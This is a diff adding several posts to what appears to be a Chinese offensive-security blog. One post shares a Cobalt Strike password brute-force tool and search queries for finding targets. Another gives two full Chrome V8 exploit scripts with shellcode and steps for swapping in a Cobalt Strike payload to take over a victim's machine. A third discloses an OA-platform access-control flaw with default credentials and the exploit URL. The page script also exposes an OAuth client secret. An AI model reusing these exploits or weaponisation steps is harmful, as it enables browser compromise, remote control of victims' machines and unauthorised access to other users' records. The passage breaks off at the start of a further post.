@@ -66,6 +66,313 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-cs批量爆破" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/09/17/cs%E6%89%B9%E9%87%8F%E7%88%86%E7%A0%B4/" class="article-date">
+  <time datetime="2021-09-17T13:04:28.000Z" itemprop="datePublished">2021-09-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/17/cs%E6%89%B9%E9%87%8F%E7%88%86%E7%A0%B4/">cs批量爆破</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>cs密码批量爆破显ip<br>显示的更清楚</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Ht_SCsTIeZM7w-GS8hrhkQ">https://pan.baidu.com/s/1Ht_SCsTIeZM7w-GS8hrhkQ</a><br>提取码：1234<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p>
+<p>之前改的大佬的没有显示ip，然后把ip显示了出来，就不用一个一个去找ip了，结合了单ip破解和多ip破解，ip.txt放ip，pass.txt放密码，结合fofa语句</p>
+<p><img src="https://secquan.zzyuncheng.com/9203cada769e607877e564d2d8fb8a32.png-quanzi" alt="enter image description here"></p>
+<p><img src="https://secquan.zzyuncheng.com/45965fd070771d31f524b173d58ca9a7.png-quanzi" alt="enter image description here"></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2021/09/17/cs%E6%89%B9%E9%87%8F%E7%88%86%E7%A0%B4/" data-id="cktodqqbz00008hcp6uao0p5y" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-google-0day" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/04/19/google-0day/" class="article-date">
+  <time datetime="2021-04-19T08:38:46.000Z" itemprop="datePublished">2021-04-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/19/google-0day/">google-0day</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Cobalt Strike 利用 Chrome 0day 上线c x64<br>POC (弹记事本的): </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;script&gt;<br>   function gc() &#123;<br>       for (var i &#x3D; 0; i &lt; 0x80000; ++i) &#123;<br>           var a &#x3D; new ArrayBuffer();<br>      &#125;<br>  &#125;<br>   let shellcode &#x3D; [0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,<br>       0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,<br>       0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,<br>       0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,<br>       0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,<br>       0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,<br>       0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,<br>       0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,<br>       0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,<br>       0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,<br>       0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,<br>       0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,<br>       0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,<br>       0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,<br>       0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,<br>       0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,<br>       0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70,<br>       0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00];<br>   var wasmCode &#x3D; new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);<br>   var wasmModule &#x3D; new WebAssembly.Module(wasmCode);<br>   var wasmInstance &#x3D; new WebAssembly.Instance(wasmModule);<br>   var main &#x3D; wasmInstance.exports.main;<br>   var bf &#x3D; new ArrayBuffer(8);<br>   var bfView &#x3D; new DataView(bf);<br>   function fLow(f) &#123;<br>       bfView.setFloat64(0, f, true);<br>       return (bfView.getUint32(0, true));<br>  &#125;<br>   function fHi(f) &#123;<br>       bfView.setFloat64(0, f, true);<br>       return (bfView.getUint32(4, true))<br>  &#125;<br>   function i2f(low, hi) &#123;<br>       bfView.setUint32(0, low, true);<br>       bfView.setUint32(4, hi, true);<br>       return bfView.getFloat64(0, true);<br>  &#125;<br>   function f2big(f) &#123;<br>       bfView.setFloat64(0, f, true);<br>       return bfView.getBigUint64(0, true);<br>  &#125;<br>   function big2f(b) &#123;<br>       bfView.setBigUint64(0, b, true);<br>       return bfView.getFloat64(0, true);<br>  &#125;<br>   class LeakArrayBuffer extends ArrayBuffer &#123;<br>       constructor(size) &#123;<br>           super(size);<br>           this.slot &#x3D; 0xb33f;<br>      &#125;<br>  &#125;<br>   function foo(a) &#123;<br>       let x &#x3D; -1;<br>       if (a) x &#x3D; 0xFFFFFFFF;<br>       var arr &#x3D; new Array(Math.sign(0 - Math.max(0, x, -1)));<br>       arr.shift();<br>       let local_arr &#x3D; Array(2);<br>       local_arr[0] &#x3D; 5.1;&#x2F;&#x2F;4014666666666666<br>       let buff &#x3D; new LeakArrayBuffer(0x1000);&#x2F;&#x2F;byteLength idx&#x3D;8<br>       arr[0] &#x3D; 0x1122;<br>       return [arr, local_arr, buff];<br>  &#125;<br>   for (var i &#x3D; 0; i &lt; 0x10000; ++i)<br>       foo(false);<br>   gc(); gc();<br>  [corrput_arr, rwarr, corrupt_buff] &#x3D; foo(true);<br>   corrput_arr[12] &#x3D; 0x22444;<br>   delete corrput_arr;<br>   function setbackingStore(hi, low) &#123;<br>       rwarr[4] &#x3D; i2f(fLow(rwarr[4]), hi);<br>       rwarr[5] &#x3D; i2f(low, fHi(rwarr[5]));<br>  &#125;<br>   function leakObjLow(o) &#123;<br>       corrupt_buff.slot &#x3D; o;<br>       return (fLow(rwarr[9]) - 1);<br>  &#125;<br>   let corrupt_view &#x3D; new DataView(corrupt_buff);<br>   let corrupt_buffer_ptr_low &#x3D; leakObjLow(corrupt_buff);<br>   let idx0Addr &#x3D; corrupt_buffer_ptr_low - 0x10;<br>   let baseAddr &#x3D; (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;<br>   let delta &#x3D; baseAddr + 0x1c - idx0Addr;<br>   if ((delta % 8) &#x3D;&#x3D; 0) &#123;<br>       let baseIdx &#x3D; delta &#x2F; 8;<br>       this.base &#x3D; fLow(rwarr[baseIdx]);<br>  &#125; else &#123;<br>       let baseIdx &#x3D; ((delta - (delta % 8)) &#x2F; 8);<br>       this.base &#x3D; fHi(rwarr[baseIdx]);<br>  &#125;<br>   let wasmInsAddr &#x3D; leakObjLow(wasmInstance);<br>   setbackingStore(wasmInsAddr, this.base);<br>   let code_entry &#x3D; corrupt_view.getFloat64(13 * 8, true);<br>   setbackingStore(fLow(code_entry), fHi(code_entry));<br>   for (let i &#x3D; 0; i &lt; shellcode.length; i++) &#123;<br>       corrupt_view.setUint8(i, shellcode[i]);<br>  &#125;<br>   main();<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>CS开启监听</p>
+<p>监听器随意，https的稳定</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRN0QvBLAbQ3Xohec4Wx31zA77hDrxSgicL0hkj6BeNiaES3s4CrDgXlPoBbxpB84vibvpib5h9aMpN7w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="enter image description here"></p>
+<p>生成payload</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRN0QvBLAbQ3Xohec4Wx31zoUiaKYNVd1sLx8XInls2eOL5EW6o9UszEVwVwsyqru6lcdtSBAsNHIw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="enter image description here"></p>
+<p>记得勾选64位</p>
+<p>获得C的payload</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRN0QvBLAbQ3Xohec4Wx31zeoCJQwBDxQZB1qNt9AfmmwiatPIibQ0JVU00W8YicyRlRA6I1uDImpMFA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="enter image description here"></p>
+<p>类似这样</p>
+<p>取出 shellcode 部分 全局替换  \ 为 ,0 然后取出来shellcode  放入 chrome 0day 中</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRN0QvBLAbQ3Xohec4Wx31zbbH5au0soEib0s8JuQCjv7pxsJqdiabFUbbBY6libEZFa1icx7icEkzLgRg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="enter image description here"></p>
+<p>替换后</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRN0QvBLAbQ3Xohec4Wx31ztvM6VmiczhngADz7GJqsvBr03jCqwK6ZfquicDM4ZEUoQE5BncMxZArQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="enter image description here"><br>复制出来 放入文章开头的 POC 中 第7行 给shellcode  赋值数组</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRN0QvBLAbQ3Xohec4Wx31zQEGsCEV04wic4yiaYgyVJzGmlzAjOGGEWQibch75tPdhXlniaUuHWN84Lw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="enter image description here"></p>
+<p>保存 成 msf.html</p>
+<p>chrome 浏览器  创建快捷方式到桌面 右键编辑快捷方式</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRN0QvBLAbQ3Xohec4Wx31zG7ewmEgiboCJ3jPpstU5fDSAPicLJia32YO1TvODqlYfUoXibSpF9Vl8aw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="enter image description here"></p>
+<p>增加 -no-sandbox 参数 关闭沙箱</p>
+<p>在chrome浏览器打开 msf.html  ， CS 上线！</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/olwnDibj8yicRN0QvBLAbQ3Xohec4Wx31zly1g5Y73iciaubicgWkNDfIF75sPJYbXcmletahF2ibUkwIAGdk3QvwZTg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="enter image description here"></p>
+<p>payload c#weijs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><code class="hljs plain">ENABLE_LOG &#x3D; true;<br>IN_WORKER &#x3D; true;<br><br>&#x2F;&#x2F; run calc and hang in a loop<br>var shellcode &#x3D; [#shellcode];&#x2F;&#x2F;shellcode替换成自己的 注意是x86的c#<br><br>function print(data) &#123;<br>&#125;<br><br><br>var not_optimised_out &#x3D; 0;<br>var target_function &#x3D; (function (value) &#123;<br>    if (value &#x3D;&#x3D; 0xdecaf0) &#123;<br>        not_optimised_out +&#x3D; 1;<br>    &#125;<br>    not_optimised_out +&#x3D; 1;<br>    not_optimised_out |&#x3D; 0xff;<br>    not_optimised_out *&#x3D; 12;<br>&#125;);<br><br>for (var i &#x3D; 0; i &lt; 0x10000; ++i) &#123;<br>    target_function(i);<br>&#125;<br><br><br>var g_array;<br>var tDerivedNCount &#x3D; 17 * 87481 - 8;<br>var tDerivedNDepth &#x3D; 19 * 19;<br><br>function cb(flag) &#123;<br>    if (flag &#x3D;&#x3D; true) &#123;<br>        return;<br>    &#125;<br>    g_array &#x3D; new Array(0);<br>    g_array[0] &#x3D; 0x1dbabe * 2;<br>    return &#39;c01db33f&#39;;<br>&#125;<br><br>function gc() &#123;<br>    for (var i &#x3D; 0; i &lt; 0x10000; ++i) &#123;<br>        new String();<br>    &#125;<br>&#125;<br><br>function oobAccess() &#123;<br>    var this_ &#x3D; this;<br>    this.buffer &#x3D; null;<br>    this.buffer_view &#x3D; null;<br><br>    this.page_buffer &#x3D; null;<br>    this.page_view &#x3D; null;<br><br>    this.prevent_opt &#x3D; [];<br><br>    var kSlotOffset &#x3D; 0x1f;<br>    var kBackingStoreOffset &#x3D; 0xf;<br><br>    class LeakArrayBuffer extends ArrayBuffer &#123;<br>        constructor() &#123;<br>            super(0x1000);<br>            this.slot &#x3D; this;<br>        &#125;<br>    &#125;<br><br>    this.page_buffer &#x3D; new LeakArrayBuffer();<br>    this.page_view &#x3D; new DataView(this.page_buffer);<br><br>    new RegExp(&#123; toString: function () &#123; return &#39;a&#39; &#125; &#125;);<br>    cb(true);<br><br>    class DerivedBase extends RegExp &#123;<br>        constructor() &#123;<br>            &#x2F;&#x2F; var array &#x3D; null;<br>            super(<br>                &#x2F;&#x2F; at this point, the 4-byte allocation for the JSRegExp &#96;this&#96; object<br>                &#x2F;&#x2F; has just happened.<br>                &#123;<br>                    toString: cb<br>                &#125;, &#39;g&#39;<br>                &#x2F;&#x2F; now the runtime JSRegExp constructor is called, corrupting the<br>                &#x2F;&#x2F; JSArray.<br>            );<br><br>            &#x2F;&#x2F; this allocation will now directly follow the FixedArray allocation<br>            &#x2F;&#x2F; made for &#96;this.data&#96;, which is where &#96;array.elements&#96; points to.<br>            this_.buffer &#x3D; new ArrayBuffer(0x80);<br>            g_array[8] &#x3D; this_.page_buffer;<br>        &#125;<br>    &#125;<br><br>    &#x2F;&#x2F; try&#123;<br>    var derived_n &#x3D; eval(&#96;(function derived_n(i) &#123;<br>        if (i &#x3D;&#x3D; 0) &#123;<br>            return DerivedBase;<br>        &#125;<br><br>        class DerivedN extends derived_n(i-1) &#123;<br>            constructor() &#123;<br>                super();<br>                return;<br>                $&#123;&quot;this.a&#x3D;0;&quot;.repeat(tDerivedNCount)&#125;<br>            &#125;<br>        &#125;<br><br>        return DerivedN;<br>    &#125;)&#96;);<br><br>    gc();<br><br><br>    new (derived_n(tDerivedNDepth))();<br><br>    this.buffer_view &#x3D; new DataView(this.buffer);<br>    this.leakPtr &#x3D; function (obj) &#123;<br>        this.page_buffer.slot &#x3D; obj;<br>        return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);<br>    &#125;<br><br>    this.setPtr &#x3D; function (addr) &#123;<br>        this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);<br>    &#125;<br><br>    this.read32 &#x3D; function (addr) &#123;<br>        this.setPtr(addr);<br>        return this.page_view.getUint32(0, true, ...this.prevent_opt);<br>    &#125;<br><br>    this.write32 &#x3D; function (addr, value) &#123;<br>        this.setPtr(addr);<br>        this.page_view.setUint32(0, value, true, ...this.prevent_opt);<br>    &#125;<br><br>    this.write8 &#x3D; function (addr, value) &#123;<br>        this.setPtr(addr);<br>        this.page_view.setUint8(0, value, ...this.prevent_opt);<br>    &#125;<br><br>    this.setBytes &#x3D; function (addr, content) &#123;<br>        for (var i &#x3D; 0; i &lt; content.length; i++) &#123;<br>            this.write8(addr + i, content[i]);<br>        &#125;<br>    &#125;<br>    return this;<br>&#125;<br><br>function trigger() &#123;<br>    var oob &#x3D; oobAccess();<br><br>    var func_ptr &#x3D; oob.leakPtr(target_function);<br>    print(&#39;[*] target_function at 0x&#39; + func_ptr.toString(16));<br><br>    var kCodeInsOffset &#x3D; 0x1b;<br><br>    var code_addr &#x3D; oob.read32(func_ptr + kCodeInsOffset);<br>    print(&#39;[*] code_addr at 0x&#39; + code_addr.toString(16));<br><br>    oob.setBytes(code_addr, shellcode);<br><br>    target_function(0);<br>&#125;<br><br>try&#123;<br>    print(&quot;start running&quot;);<br>    trigger();<br>&#125;catch(e)&#123;<br>    print(e);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2021/04/19/google-0day/" data-id="cknocn2ya00008hcpfylr64i9" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-金和协同水平越权漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/04/04/%E9%87%91%E5%92%8C%E5%8D%8F%E5%90%8C%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2021-04-04T03:43:29.000Z" itemprop="datePublished">2021-04-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/04/%E9%87%91%E5%92%8C%E5%8D%8F%E5%90%8C%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/">金和协同水平越权漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>0day 3.28 金和协同管理OA平台. 水平越权漏洞<br>此洞是由 goddmeon 师傅挖掘并授权发表。</p>
+<p>在此感谢 goddmeon 师傅。</p>
+<p>FoFA语法：</p>
+<p>body=”金和协同管理平台” &amp;&amp; country=”CN”</p>
+<p>默认口令</p>
+<p>admin / 000000</p>
+<p>后台登录水平越权</p>
+<p>C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&amp;UserID=想要的id用户</p>
+<p>这个id指的是用户编号</p>
+<p>登录，用过用户管理，看到用户编号0001为董事长</p>
+<p>这是admin管理员权限登录的界面</p>
+<p><img src="http://www.0dayhack.net/wp-content/uploads/%E5%9B%BE%E7%89%87-2-1536x639.png" alt="enter image description here"></p>
+<p>为了验证水平越权漏洞，我们登录一个普通用户账号，下面是普通用户登录后的界面。</p>
+<p><img src="http://www.0dayhack.net/wp-content/uploads/2021/04/%E5%9B%BE%E7%89%87-1536x781.png" alt="enter image description here"></p>
+<p>访问url:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>http:&#x2F;&#x2F;www.xxxxxxx.net&#x2F;C6&#x2F;JHSoft.Web.Dossier&#x2F;DossierBaseInfoView.aspx?CollID&#x3D;1&amp;UserID&#x3D;0001<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://www.0dayhack.net/wp-content/uploads/%E5%9B%BE%E7%89%87-3-1536x780.png" alt="enter image description here"></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2021/04/04/%E9%87%91%E5%92%8C%E5%8D%8F%E5%90%8C%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" data-id="ckn2mg0wl0000fjcpcf0n6qud" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-智慧教育越权" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
